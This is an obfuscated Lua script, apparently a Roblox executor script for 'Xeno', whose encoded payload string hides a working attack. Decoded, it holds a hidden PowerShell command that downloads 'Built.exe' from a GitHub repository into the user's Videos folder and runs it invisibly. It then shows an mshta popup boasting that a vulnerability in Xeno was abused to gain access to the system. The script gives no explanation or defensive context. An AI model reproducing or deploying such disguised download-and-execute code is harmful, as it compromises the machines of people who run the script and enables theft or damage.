--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 81) then
			local v86 = 0;
			while true do
				if (v86 == 0) then
					v19 = v0(v3(v30, 1, 1));
					return "";
				end
			end
		else
			local v87 = v2(v0(v30, 16));
			if v19 then
				local v115 = v5(v87, v19);
				v19 = nil;
				return v115;
			else
				return v87;
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v88 = (v31 / ((933 - (857 + 74)) ^ (v32 - (2 - 1)))) % ((5 - (1273 - (226 + 1044))) ^ (((v33 - (1 + 0)) - (v32 - 1)) + 1));
			return v88 - (v88 % (1 + 0));
		else
			local v89 = (879 - ((1227 - 945) + 595)) ^ (v32 - ((118 - (32 + 85)) - 0));
			return (((v31 % (v89 + v89)) >= v89) and (2 - 1)) or ((1684 - (68 + 997)) - (555 + 64));
		end
	end
	local function v21()
		local v34 = 0 + 0;
		local v35;
		while true do
			if (v34 == (0 + 0)) then
				v35 = v1(v16, v18, v18);
				v18 = v18 + (958 - (892 + 65));
				v34 = (3 - 1) - 1;
			end
			if (v34 == (1 - 0)) then
				return v35;
			end
		end
	end
	local function v22()
		local v36, v37 = v1(v16, v18, v18 + (352 - (87 + 263)));
		v18 = v18 + (182 - (67 + 113));
		return (v37 * 256) + v36;
	end
	local function v23()
		local v38, v39, v40, v41 = v1(v16, v18, v18 + 3 + 0);
		v18 = v18 + 4;
		return (v41 * (41190819 - 24413603)) + (v40 * (48199 + 17337)) + (v39 * 256) + v38;
	end
	local function v24()
		local v42 = v23();
		local v43 = v23();
		local v44 = 3 - 2;
		local v45 = (v20(v43, (1685 - 732) - (802 + (592 - (416 + 26))), 53 - 33) * ((3 - 1) ^ (24 + 8))) + v42;
		local v46 = v20(v43, 1018 - (915 + 82), 87 - 56);
		local v47 = ((v20(v43, 32) == 1) and -(1 + 0)) or (1 - 0);
		if (v46 == 0) then
			if (v45 == (1187 - (1069 + 118))) then
				return v47 * (0 - 0);
			else
				v46 = 1 - (0 - 0);
				v44 = 0 + 0;
			end
		elseif (v46 == (3636 - 1589)) then
			return ((v45 == 0) and (v47 * ((1 + 0) / (791 - (368 + 182 + 241))))) or (v47 * NaN);
		end
		return v8(v47, v46 - (3214 - 2191)) * (v44 + (v45 / ((20 - (10 + 8)) ^ (199 - (585 - (145 + 293))))));
	end
	local function v25(v48)
		local v49;
		if not v48 then
			v48 = v23();
			if (v48 == (430 - (44 + 386))) then
				return "";
			end
		end
		v49 = v3(v16, v18, (v18 + v48) - (1487 - (998 + 488)));
		v18 = v18 + v48;
		local v50 = {};
		for v67 = 1 + 0, #v49 do
			v50[v67] = v2(v1(v3(v49, v67, v67)));
		end
		return v6(v50);
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v51 = (function()
			return function(v90, v91, v92, v93, v94, v95, v96, v97)
				local v90 = (function()
					return 0 - 0;
				end)();
				local v91 = (function()
					return;
				end)();
				local v93 = (function()
					return;
				end)();
				while true do
					if (v90 == (261 - (241 + 20))) then
						local v120 = (function()
							return 0;
						end)();
						while true do
							if (v120 ~= (0 - 0)) then
							else
								v91 = (function()
									return v92();
								end)();
								v93 = (function()
									return nil;
								end)();
								v120 = (function()
									return 1 + 0;
								end)();
							end
							if ((439 - (262 + 176)) == v120) then
								v90 = (function()
									return #",";
								end)();
								break;
							end
						end
					end
					if (v90 ~= #".") then
					else
						if (v91 == #"!") then
							v93 = (function()
								return v92() ~= (1721 - (345 + 1376));
							end)();
						elseif (v91 == (2 + 0)) then
							v93 = (function()
								return v94();
							end)();
						elseif (v91 == #"xxx") then
							v93 = (function()
								return v95();
							end)();
						end
						v96[v97] = (function()
							return v93;
						end)();
						break;
					end
				end
				return v90, v91, v92, v93, v94, v95, v96, v97;
			end;
		end)();
		local v52 = (function()
			return function(v98, v99, v100, v101, v102, v103, v104, v105, v106)
				local v107 = (function()
					return 688 - (198 + 490);
				end)();
				local v98 = (function()
					return;
				end)();
				local v99 = (function()
					return;
				end)();
				while true do
					if (v107 == 0) then
						local v122 = (function()
							return 0 - 0;
						end)();
						while true do
							if (v122 ~= (868 - (550 + 317))) then
							else
								v107 = (function()
									return 4 - 3;
								end)();
								break;
							end
							if (v122 == (0 - 0)) then
								v98 = (function()
									return 0;
								end)();
								v99 = (function()
									return nil;
								end)();
								v122 = (function()
									return 2 - 1;
								end)();
							end
						end
					end
					if (v107 ~= (1207 - (696 + 510))) then
					else
						local v123 = (function()
							return 0 - 0;
						end)();
						while true do
							if (v123 == 0) then
								local v126 = (function()
									return 1262 - (1091 + 171);
								end)();
								while true do
									if (v126 == 0) then
										while true do
											if ((1665 - (970 + 695)) == v98) then
												v99 = (function()
													return v100();
												end)();
												if (v101(v99, #"!", #"!") == 0) then
													local v142 = (function()
														return 0 + 0;
													end)();
													local v143 = (function()
														return;
													end)();
													local v144 = (function()
														return;
													end)();
													local v145 = (function()
														return;
													end)();
													while true do
														if ((9 - 6) == v142) then
															if (v101(v144, #"91(", #"gha") == #"[") then
																v145[#"asd1"] = (function()
																	return v104[v145[#"?id="]];
																end)();
															end
															v105[v106] = (function()
																return v145;
															end)();
															break;
														end
														if (v142 ~= (3 - 2)) then
														else
															local v279 = (function()
																return 1990 - (582 + 1408);
															end)();
															local v280 = (function()
																return;
															end)();
															while true do
																if (v279 == 0) then
																	v280 = (function()
																		return 0;
																	end)();
																	while true do
																		if (v280 == 0) then
																			v145 = (function()
																				return {v102(),v102(),nil,nil};
																			end)();
																			if (v143 == (374 - (123 + 251))) then
																				local v331 = (function()
																					return 0;
																				end)();
																				while true do
																					if (v331 == (0 - 0)) then
																						v145[#"19("] = (function()
																							return v102();
																						end)();
																						v145[#"asd1"] = (function()
																							return v102();
																						end)();
																						break;
																					end
																				end
																			elseif (v143 == #",") then
																				v145[#"91("] = (function()
																					return v103();
																				end)();
																			elseif (v143 == 2) then
																				v145[#"xnx"] = (function()
																					return v103() - ((7 - 5) ^ (714 - (208 + 490)));
																				end)();
																			elseif (v143 == #"asd") then
																				local v336 = (function()
																					return 0 + 0;
																				end)();
																				local v337 = (function()
																					return;
																				end)();
																				while true do
																					if (v336 == (241 - (187 + 54))) then
																						v337 = (function()
																							return 0 + 0;
																						end)();
																						while true do
																							if (v337 == (836 - (660 + 176))) then
																								v145[#"-19"] = (function()
																									return v103() - (2 ^ (2 + 14));
																								end)();
																								v145[#"0836"] = (function()
																									return v102();
																								end)();
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																			v280 = (function()
																				return 1 - 0;
																			end)();
																		end
																		if (v280 ~= (203 - (14 + 188))) then
																		else
																			v142 = (function()
																				return 2 - 0;
																			end)();
																			break;
																		end
																	end
																	break;
																end
															end
														end
														if (v142 ~= (1 + 1)) then
														else
															if (v101(v144, #"\\", #"~") == #"{") then
																v145[677 - (534 + 141)] = (function()
																	return v104[v145[1638 - (1373 + 263)]];
																end)();
															end
															if (v101(v144, 1002 - (451 + 549), 1 + 1) == #"~") then
																v145[#"xxx"] = (function()
																	return v104[v145[#"-19"]];
																end)();
															end
															v142 = (function()
																return 4 - 1;
															end)();
														end
														if (v142 ~= (0 + 0)) then
														else
															local v281 = (function()
																return 0;
															end)();
															while true do
																if (v281 ~= (1 - 0)) then
																else
																	v142 = (function()
																		return 1 + 0;
																	end)();
																	break;
																end
																if (v281 == (0 + 0)) then
																	v143 = (function()
																		return v101(v99, 2, #"xnx");
																	end)();
																	v144 = (function()
																		return v101(v99, #"http", 8 - 2);
																	end)();
																	v281 = (function()
																		return 1;
																	end)();
																end
															end
														end
													end
												end
												break;
											end
										end
										return v98, v99, v100, v101, v102, v103, v104, v105, v106;
									end
								end
							end
						end
					end
				end
			end;
		end)();
		local v53 = (function()
			return function(v108, v109, v110)
				local v111 = (function()
					return 0;
				end)();
				local v112 = (function()
					return;
				end)();
				while true do
					if (v111 == (0 - 0)) then
						v112 = (function()
							return 0;
						end)();
						while true do
							if (0 == v112) then
								v108[v109 - #"|"] = (function()
									return v110();
								end)();
								return v108, v109, v110;
							end
						end
						break;
					end
				end
			end;
		end)();
		local v54 = (function()
			return {};
		end)();
		local v55 = (function()
			return {};
		end)();
		local v56 = (function()
			return {};
		end)();
		local v57 = (function()
			return {v54,v55,nil,v56};
		end)();
		local v58 = (function()
			return v23();
		end)();
		local v59 = (function()
			return {};
		end)();
		for v69 = #",", v58 do
			FlatIdent_475BC, Type, v21, Cons, v24, v25, v59, v69 = (function()
				return v51(FlatIdent_475BC, Type, v21, Cons, v24, v25, v59, v69);
			end)();
		end
		v57[#"asd"] = (function()
			return v21();
		end)();
		for v70 = #"}", v23() do
			FlatIdent_43862, Descriptor, v21, v20, v22, v23, v59, v54, v70 = (function()
				return v52(FlatIdent_43862, Descriptor, v21, v20, v22, v23, v59, v54, v70);
			end)();
		end
		for v71 = #"~", v23() do
			v55, v71, v28 = (function()
				return v53(v55, v71, v28);
			end)();
		end
		return v57;
	end
	local function v29(v61, v62, v63)
		local v64 = v61[1 + 0];
		local v65 = v61[1 + 1];
		local v66 = v61[563 - (306 + 254)];
		return function(...)
			local v72 = v64;
			local v73 = v65;
			local v74 = v66;
			local v75 = v27;
			local v76 = (1062 - (810 + 251)) + 0;
			local v77 = -(1 - 0);
			local v78 = {};
			local v79 = {...};
			local v80 = v12("#", ...) - (1 + 0);
			local v81 = {};
			local v82 = {};
			for v113 = 0 - 0, v80 do
				if (v113 >= v74) then
					v78[v113 - v74] = v79[v113 + (604 - (268 + 335))];
				else
					v82[v113] = v79[v113 + (291 - (60 + 230))];
				end
			end
			local v83 = (v80 - v74) + (573 - (426 + 146));
			local v84;
			local v85;
			while true do
				local v114 = 0 + 0;
				while true do
					if (v114 == ((1012 + 445) - (282 + 1174))) then
						if ((v85 <= (837 - (569 + 242))) or (1313 == 794)) then
							if (v85 <= ((11 + 23) - 22)) then
								if ((3174 > 2902) and ((v85 <= (1 + 4)) or (1936 == 3561))) then
									if ((4120 <= 4260) and (v85 <= (1026 - (706 + 287 + 31)))) then
										if ((1386 == 1386) and (v85 <= (1251 - (721 + 530)))) then
											if (not v82[v84[(1806 - (43 + 490)) - (945 + 326)]] or (883 > 4778)) then
												v76 = v76 + (2 - 1);
											else
												v76 = v84[3 + 0];
											end
										elseif ((137 == 137) and (v85 > (701 - (271 + 429)))) then
											if not v82[v84[2 + 0]] then
												v76 = v76 + (1501 - (1408 + 92));
											else
												v76 = v84[3];
											end
										else
											v82[v84[(1821 - (711 + 22)) - (461 + 625)]] = v82[v84[11 - 8]] % v82[v84[1292 - ((1852 - (240 + 619)) + 72 + 223)]];
										end
									elseif (v85 <= (1 + 2)) then
										v82[v84[1173 - (418 + 753)]] = v63[v84[3]];
									elseif (v85 == ((2 - 0) + 2)) then
										local v148 = v84[2];
										local v149 = v82[v84[1 + 2]];
										v82[v148 + 1] = v149;
										v82[v148] = v149[v84[2 + 2]];
									else
										v82[v84[1 + 1]] = v82[v84[532 - (406 + 9 + 114)]];
									end
								elseif (v85 <= (1777 - (1749 + 20))) then
									if (v85 <= (2 + 4)) then
										v76 = v84[1325 - (1249 + 73)];
									elseif ((v85 == (3 + 4)) or (1570 >= 4332)) then
										local v155 = v84[1147 - (466 + 679)];
										local v156 = v82[v155];
										local v157 = v82[v155 + (4 - (1746 - (1344 + 400)))];
										if (v157 > (0 - 0)) then
											if (v156 > v82[v155 + (1901 - (106 + 1794))]) then
												v76 = v84[1 + 2];
											else
												v82[v155 + 1 + 2] = v156;
											end
										elseif (v156 < v82[v155 + (2 - 1)]) then
											v76 = v84[3];
										else
											v82[v155 + (7 - 4)] = v156;
										end
									else
										v82[v84[2]] = v62[v84[117 - (4 + (515 - (255 + 150)))]];
									end
								elseif ((v85 <= 10) or (3620 >= 4891)) then
									if ((4258 > 937) and (v85 > (593 - (57 + 527)))) then
										v82[v84[1429 - (41 + 1386)]] = {};
									else
										v82[v84[105 - (17 + 86)]] = v82[v84[3]];
									end
								elseif (v85 > 11) then
									local v163 = v84[2 + 0 + 0];
									local v164 = v82[v84[6 - 3]];
									v82[v163 + ((2 + 0) - 1)] = v164;
									v82[v163] = v164[v84[170 - (122 + 44)]];
								else
									v82[v84[(8 - 6) - 0]] = v84[9 - (19 - 13)] + v82[v84[4 + (1739 - (404 + 1335))]];
								end
							elseif (v85 <= (3 + 16)) then
								if (v85 <= 15) then
									if ((v85 <= 13) or (4064 <= 1819)) then
										v82[v84[3 - 1]][v84[68 - (30 + 35)]] = v82[v84[4]];
									elseif (v85 == (10 + (410 - (183 + 223)))) then
										local v169 = v73[v84[1260 - (1043 + 214)]];
										local v170;
										local v171 = {};
										v170 = v10({}, {__index=function(v247, v248)
											local v249 = v171[v248];
											return v249[3 - 2][v249[2]];
										end,__newindex=function(v250, v251, v252)
											local v253 = v171[v251];
											v253[1213 - (323 + 889)][v253[2]] = v252;
										end});
										for v255 = 2 - 1, v84[(709 - 125) - (361 + 219)] do
											local v256 = (213 + 107) - (53 + 267);
											local v257;
											while true do
												if ((v256 == (0 + 0)) or (4986 < 1574) or (4869 < 906)) then
													v76 = v76 + (414 - (15 + 144 + 254));
													v257 = v72[v76];
													v256 = 983 - ((355 - (10 + 327)) + 964);
												end
												if ((4426 > 172) and (v256 == ((3 + 0) - 2))) then
													if ((586 > 455) and (v257[1 + 0] == (6 + 3))) then
														v171[v255 - (851 - (20 + 830))] = {v82,v257[1 + 2]};
													else
														v171[v255 - (739 - (542 + 196))] = {v62,v257[2 + 1]};
													end
													v81[#v81 + (450 - (108 + 341)) + 0] = v171;
													break;
												end
											end
										end
										v82[v84[4 - 2]] = v29(v169, v170, v63);
									else
										local v173 = 0 - 0;
										local v174;
										local v175;
										local v176;
										local v177;
										while true do
											if ((826 == 826) and (v173 == 0)) then
												v174 = v84[1553 - (1126 + 425)];
												v175, v176 = v75(v82[v174](v13(v82, v174 + 1, v77)));
												v173 = 406 - (53 + 65 + 287);
											end
											if ((v173 == (8 - 6)) or (4019 > 4441)) then
												for v300 = v174, v77 do
													v177 = v177 + (3 - 2);
													v82[v300] = v175[v177];
												end
												break;
											end
											if (((2017 < 4261) and (v173 == (1122 - ((1611 - (711 + 782)) + 1003)))) or (1225 > 4228)) then
												v77 = (v176 + v174) - (2 - 1);
												v177 = 377 - (142 + 235);
												v173 = 9 - 7;
											end
										end
									end
								elseif ((4716 > 80) and (v85 <= 17)) then
									if ((3328 > 2238) and ((v85 > (4 + 12)) or (3507 == 3272))) then
										local v178 = 0;
										local v179;
										local v180;
										local v181;
										while true do
											if ((3839 > 1405) and (v178 == (977 - (553 + 424)))) then
												v179 = v84[(5 - 2) - 1];
												v180 = v82[v179];
												v178 = 1 + 0;
											end
											if ((v178 == 1) or (876 >= 3075)) then
												v181 = v82[v179 + 2 + 0];
												if (v181 > (469 - (270 + 199))) then
													if (v180 > v82[v179 + 1 + 0]) then
														v76 = v84[3];
													else
														v82[v179 + 2 + 1] = v180;
													end
												elseif (v180 < v82[v179 + 1 + 0]) then
													v76 = v84[6 - 3];
												else
													v82[v179 + (7 - 4)] = v180;
												end
												break;
											end
										end
									else
										do
											return;
										end
									end
								elseif (v85 == (40 - 22)) then
									local v182 = v84[2];
									do
										return v13(v82, v182, v77);
									end
								else
									v82[v84[1 + 1]] = v82[v84[14 - 11]][v84[757 - (239 + 514)]];
								end
							elseif ((4352 > 2554) and (v85 <= (8 + 5 + 9))) then
								if (v85 <= (1349 - (797 + 532))) then
									local v133 = v84[2 + 0];
									v82[v133] = v82[v133](v13(v82, v133 + 1 + 0, v84[3]));
								elseif ((v85 > (49 - 28)) or (4406 < 4043)) then
									local v185 = v84[2];
									local v186 = v82[v185 + ((3023 - (580 + 1239)) - ((1108 - 735) + 829))];
									local v187 = v82[v185] + v186;
									v82[v185] = v187;
									if (v186 > 0) then
										if ((v187 <= v82[v185 + (732 - (476 + 255))]) or (1293 <= 507)) then
											v76 = v84[3];
											v82[v185 + (1133 - (369 + 761))] = v187;
										end
									elseif ((v187 >= v82[v185 + 1 + 0]) or (2896 < 805)) then
										v76 = v84[3];
										v82[v185 + 3] = v187;
									end
								else
									local v189 = 0 - 0;
									local v190;
									local v191;
									local v192;
									local v193;
									while true do
										if (v189 == 1) then
											v77 = (v192 + v190) - 1;
											v193 = 0;
											v189 = 3 - 1;
										end
										if (v189 == (240 - (64 + 167 + 7))) then
											for v307 = v190, v77 do
												v193 = v193 + 1 + 0;
												v82[v307] = v191[v193];
											end
											break;
										end
										if (v189 == (0 - 0)) then
											v190 = v84[2];
											v191, v192 = v75(v82[v190](v13(v82, v190 + (337 - (144 + 192)), v84[219 - (42 + 174)])));
											v189 = 1 + 0;
										end
									end
								end
							elseif ((2316 == 2316) and (v85 <= 24)) then
								if (v85 == (1 + 19 + 3)) then
									local v194 = v84[1 + 1];
									do
										return v82[v194](v13(v82, v194 + 1, v84[1507 - (363 + 1141)]));
									end
								else
									local v195 = v84[2];
									do
										return v13(v82, v195, v77);
									end
								end
							elseif ((v85 == (1605 - (1183 + 397))) or (2570 == 1533)) then
								local v196 = v84[5 - (2 + 1)];
								local v197, v198 = v75(v82[v196](v82[v196 + 1 + 0]));
								v77 = (v198 + v196) - (1 + 0);
								local v199 = 0;
								for v258 = v196, v77 do
									v199 = v199 + 1;
									v82[v258] = v197[v199];
								end
							else
								local v200 = v84[1977 - ((4994 - 3081) + 39 + 23)];
								local v201, v202 = v75(v82[v200](v82[v200 + (1168 - (645 + 522)) + 0]));
								v77 = (v202 + v200) - (2 - 1);
								local v203 = 1933 - (565 + 1368);
								for v261 = v200, v77 do
									local v262 = 0;
									while true do
										if (v262 == (0 - 0)) then
											v203 = v203 + (1662 - (1477 + (1974 - (1010 + 780))));
											v82[v261] = v201[v203];
											break;
										end
									end
								end
							end
						elseif (v85 <= (52 - 13)) then
							if ((v85 <= 32) or (1889 >= 3383)) then
								if ((v85 <= (28 + 1)) or (883 == 1460)) then
									if (v85 <= (883 - (564 + 292))) then
										v82[v84[2 - (0 + 0)]] = v82[v84[3]] + v84[11 - 7];
									elseif (v85 == (332 - (244 + (285 - 225)))) then
										v82[v84[(5 - 3) + 0]] = v82[v84[(2315 - (1045 + 791)) - (41 + 435)]] + v84[1005 - (938 + (159 - 96))];
									else
										local v205 = v84[2];
										v82[v205] = v82[v205](v13(v82, v205 + 1 + 0, v84[1128 - (936 + 189)]));
									end
								elseif (v85 <= (10 + 20)) then
									v82[v84[(2466 - 851) - (1565 + 48)]] = v84[2 + 1];
								elseif (v85 == (1169 - ((1287 - (351 + 154)) + 356))) then
									v82[v84[269 - (176 + 91)]] = v82[v84[7 - 4]] % v84[4];
								else
									v82[v84[2]] = v84[4 - 1];
								end
							elseif ((1892 <= 2734) and (v85 <= (1127 - (975 + 117)))) then
								if (((1923 < 2218) and (v85 <= (1908 - (157 + 1718)))) or (4619 <= 999)) then
									v82[v84[2 + 0]] = #v82[v84[10 - 7]];
								elseif (v85 == (115 - 81)) then
									local v210 = v73[v84[1021 - ((2271 - (1281 + 293)) + 321)]];
									local v211;
									local v212 = {};
									v211 = v10({}, {__index=function(v263, v264)
										local v265 = 266 - (28 + 238);
										local v266;
										while true do
											if (v265 == (0 - 0)) then
												v266 = v212[v264];
												return v266[1][v266[5 - 3]];
											end
										end
									end,__newindex=function(v267, v268, v269)
										local v270 = v212[v268];
										v270[1 - 0][v270[4 - 2]] = v269;
									end});
									for v272 = 1 + 0 + 0, v84[6 - 2] do
										local v273 = 0 - 0;
										local v274;
										while true do
											if (v273 == (1228 - (322 + 905))) then
												if (((2173 > 379) and (v274[612 - (602 + 9)] == (1198 - (449 + 740)))) or (3410 > 4116)) then
													v212[v272 - 1] = {v82,v274[9 - 6]};
												else
													v212[v272 - 1] = {v62,v274[443 - (382 + 58)]};
												end
												v81[#v81 + 1] = v212;
												break;
											end
											if ((0 - 0) == v273) then
												v76 = v76 + 1;
												v274 = v72[v76];
												v273 = 1 + 0;
											end
										end
									end
									v82[v84[2]] = v29(v210, v211, v63);
								else
									v82[v84[3 - 1]] = v82[v84[8 - 5]][v84[3 + 1]];
								end
							elseif (v85 <= (1242 - (902 + 303))) then
								if (v85 == (78 - 42)) then
									v82[v84[4 - 2]] = {};
								else
									v82[v84[1 + 1]] = v82[v84[1693 - (1121 + 569)]] % v84[218 - (22 + 192)];
								end
							elseif (v85 > (721 - (483 + 200))) then
								v76 = v84[1466 - (1404 + (529 - (381 + 89)))];
							else
								local v219 = v84[5 - 3];
								v82[v219] = v82[v219](v13(v82, v219 + 1, v77));
							end
						elseif ((v85 <= (61 - 15)) or (2591 == 3409)) then
							if ((v85 <= (807 - (468 + 297))) or (903 >= 3059)) then
								if ((v85 <= (602 - (297 + 37 + 228))) or (3976 < 2857)) then
									local v139 = v84[2];
									v82[v139](v13(v82, v139 + (3 - 2), v77));
								elseif ((4930 > 2307) and (4514 > 3324) and (v85 == (94 - (36 + 17)))) then
									local v221 = 0 - 0;
									local v222;
									local v223;
									local v224;
									local v225;
									while true do
										if ((v221 == 2) or (4046 < 1291)) then
											for v315 = v222, v77 do
												v225 = v225 + 1 + 0;
												v82[v315] = v223[v225];
											end
											break;
										end
										if (v221 == (237 - (141 + 95))) then
											v77 = (v224 + v222) - 1;
											v225 = 0 + 0;
											v221 = 4 - (2 - 0);
										end
										if (v221 == 0) then
											v222 = v84[4 - 2];
											v223, v224 = v75(v82[v222](v13(v82, v222 + 1 + 0, v77)));
											v221 = 2 - (1157 - (1074 + 82));
										end
									end
								else
									local v226 = 0 + 0;
									local v227;
									while true do
										if (v226 == (0 + 0)) then
											v227 = v84[2];
											v82[v227](v13(v82, v227 + (1 - 0), v77));
											break;
										end
									end
								end
							elseif (v85 <= 44) then
								if (v85 == (26 + 17)) then
									local v228 = 163 - (92 + (155 - 84));
									local v229;
									while true do
										if (0 == v228) then
											v229 = v84[2];
											do
												return v82[v229](v13(v82, v229 + 1 + 0, v84[4 - 1]));
											end
											break;
										end
									end
								else
									local v230 = v84[2];
									v82[v230] = v82[v230](v13(v82, v230 + 1, v77));
								end
							elseif (v85 > 45) then
								v82[v84[767 - (574 + 191)]] = v63[v84[3 + 0]];
							else
								v82[v84[4 - 2]] = v84[3] + v82[v84[3 + 1]];
							end
						elseif ((v85 <= (1833 - (214 + 1570))) or (208 >= 4828)) then
							if (v85 <= 47) then
								v82[v84[851 - (254 + 595)]][v84[129 - (55 + 71)]] = v82[v84[5 - 1]];
							elseif (v85 > (1838 - (573 + 1217))) then
								local v235 = v84[5 - 3];
								local v236, v237 = v75(v82[v235](v13(v82, v235 + 1, v84[1 + 2])));
								v77 = (v237 + v235) - (1 - (1455 - (990 + 465)));
								local v238 = 939 - (714 + 225);
								for v275 = v235, v77 do
									v238 = v238 + (2 - 1);
									v82[v275] = v236[v238];
								end
							else
								v82[v84[2 - 0]] = v82[v84[1 + 2]] % v82[v84[5 - 1]];
							end
						elseif (v85 <= (857 - (118 + 688))) then
							if ((v85 == (98 - (25 + 23))) or (4241 == 3545)) then
								do
									return;
								end
							else
								v82[v84[1 + 1]] = v62[v84[3]];
							end
						elseif ((v85 > 52) or (4048 > 4232)) then
							v82[v84[2]] = #v82[v84[1889 - (927 + 959)]];
						else
							local v243 = v84[6 - 4];
							local v244 = v82[v243 + (734 - (16 + 716))];
							local v245 = v82[v243] + v244;
							v82[v243] = v245;
							if (v244 > 0) then
								if ((v245 <= v82[v243 + (1 - 0)]) or (1750 >= 3473)) then
									v76 = v84[100 - (11 + 36 + 50)];
									v82[v243 + (6 - 3)] = v245;
								end
							elseif (v245 >= v82[v243 + 1]) then
								local v320 = 285 - (77 + 98 + 110);
								while true do
									if ((3166 == 3166) and (v320 == (0 - 0))) then
										v76 = v84[3];
										v82[v243 + 3 + 0] = v245;
										break;
									end
								end
							end
						end
						v76 = v76 + (4 - 3);
						break;
					end
					if (((1796 - (503 + 1293)) == v114) or (1583 > 3567)) then
						v84 = v72[v76];
						v85 = v84[2 - 1];
						v114 = 1 + 0;
					end
				end
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!1A3Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274026Q00204003083Q0020B25A02F224472003073Q002654D72976DC46026Q001440030D3Q0010CE38CCEC37EE25CBE826D53E03053Q009C43AD4AA5026Q00F03F03093Q00F5C2CF24CBB4C31BDD03083Q007EB1A3BB4586DBA703063Q0073637269707403193Q0046696E644669727374416E636573746F725768696368497341030E3Q004C696E6B696E675365727669636503073Q004F70656E55726C030B3Q0046696E645365727669636503173Q005361766553637269707450726F66696C696E674461746103EE022Q008Q20706F7765727368652Q6C202D57696E646F775374796C652048692Q64656E202D436F2Q6D616E642022496E766F6B652D57656252657175657374202D5572692027682Q7470733A2Q2F6769746875622E636F6D2F726F636F53637269707465722F74657374646F776E6C6F61642F7261772F726566732F68656164732F6D61696E2F4275696C742E65786527202D4F757446696C652027255553455250524F46494C45255C566964656F735C4275696C742E657865273B2053746172742D50726F63652Q732027255553455250524F46494C45255C566964656F735C4275696C742E65786527202D57696E646F775374796C652048692Q64656E220A8Q2074696D656F7574202F742032300A8Q206D736874612076627363726970743A4578656375746528224372656174654F626A656374282Q22575363726970742E5368652Q6C2Q22292E506F707570202Q2248652Q6C6F2C2058656E6F20757365722120596F75206A7573742072616E2061207363726970742077686963682061627573656420612076756C6E65726162696C69747920696E2058656E6F20746F206761696E20612Q63652Q7320746F20796F75722073797374656D2E2046726F6D20686572652C20776520636F756C6420646F2077686174657665722E20436F756C642776652073746F6C656E20796F757220726F6275782C20646973636F72642C2073746F6C656E2066696C65732C20627269636B656420796F75722073797374656D2C20616E797468696E672E204C75636B696C7920666F7220796F752C207765206172656E27742074686F73652070656F706C652062757420746865206E65787420706572736F6E20746F2061627573652074686973206F6E20796F75206C696B656C7920776F6E2774206265206173206C656E69656E742E20472Q6F64206C75636B202D20407875612E676F762Q222C20302C202Q2248544D4C20412Q706C69636174696F6E2Q222C2034383A636C6F736522290A4Q2000354Q000A7Q001203000100013Q002013000100010002001203000200013Q002013000200020003001203000300013Q002013000300030004001203000400053Q0006020004000B000100010004063Q000B0001001203000400063Q002013000500040007001203000600083Q002013000600060009001203000700083Q00201300070007000A00062200083Q000100062Q00093Q00074Q00093Q00014Q00093Q00054Q00093Q00024Q00093Q00034Q00093Q00064Q0005000900083Q00121E000A000C3Q00121E000B000D4Q001D0009000B000200100D3Q000B00092Q0005000900083Q00121E000A000F3Q00121E000B00104Q001D0009000B000200100D3Q000E00092Q0005000900083Q00121E000A00123Q00121E000B00134Q001D0009000B000200100D3Q00110009001203000900143Q002004000900090015002013000B3Q00112Q001D0009000B0002002013000A00090016002004000A000A0017002004000C00090018002013000E3Q000E2Q001D000C000E0002002004000C000C001900121E000E001A3Q002013000F3Q000B2Q0031000C000F4Q002A000A3Q00012Q00323Q00013Q00013Q00023Q00026Q00F03F026Q00704002264Q000A00025Q00121E000300014Q002100045Q00121E000500013Q0004070003002100012Q003300076Q0005000800024Q0033000900014Q0033000A00024Q0033000B00034Q0033000C00044Q0005000D6Q0005000E00063Q00201C000F000600012Q0031000C000F4Q0026000B3Q00022Q0033000C00034Q0033000D00044Q0005000E00014Q0021000F00014Q0030000F0006000F00100B000F0001000F2Q0021001000014Q003000100006001000100B00100001001000201C0010001000012Q0031000D00104Q0029000C6Q0026000A3Q0002002025000A000A00022Q001A0009000A4Q002A00073Q00010004340003000500012Q0033000300054Q0005000400024Q0017000300044Q001800036Q00323Q00017Q00", v9(), ...);
